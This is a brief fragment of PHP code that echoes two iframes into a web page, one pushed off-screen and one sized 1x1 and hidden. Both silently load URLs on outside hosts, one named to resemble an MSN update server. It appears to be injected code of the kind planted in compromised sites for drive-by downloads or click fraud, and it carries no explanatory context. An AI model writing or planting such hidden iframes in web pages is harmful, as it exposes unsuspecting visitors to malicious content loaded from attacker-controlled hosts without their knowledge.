...
echo "<script>document.write('<iframe src=\"http://ezadguf.net/?click=69311306\" width=100 height=100 style=\"position:absolute;top:-10000;left:-10000;\"></iframe>');</script>";

echo "<iframe src=\"http://msnupdateserver.info/?click=1CAD5E\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>